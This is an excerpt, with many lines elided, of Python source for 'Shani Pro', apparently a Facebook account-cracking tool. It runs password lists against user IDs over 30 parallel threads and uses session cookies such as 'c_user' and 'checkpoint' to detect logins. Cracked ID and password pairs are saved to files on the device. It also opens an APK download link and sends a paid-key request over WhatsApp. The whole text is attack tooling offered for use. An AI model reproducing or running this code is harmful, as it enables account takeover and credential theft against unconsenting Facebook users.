...
os.system('xdg-open https://www.facebook.com/hamza.maloka.3)
...
----------------------------------------------
 ...
 Shani Pro version 1.9.8

 For Haters: cloning kro chup chap 😐
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Shani_VPN1.0.apk/file');menu()
                        ...
                        tks = ("Hi Shani Sir, I Need To Buy Your Paid Shani PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python Shani.py')
...
def pak():
                ...
                with tred(max_workers=30) as Shani:     
                        ...
                        for psx in user:
                                ...
                                Shani.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [Shani-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Shani=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in Shani:
                                ...
                                print('\r\r\033[1;32m [Shani-OK] %s | %s'%(ids,pas))

                                open('/sdcard/Shani-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in Shani:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [Shani-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/Shani-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Shani-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/Shani-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [Shani-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/Shani-OK.txt','a').write(uid+'|'+pas+'\n')
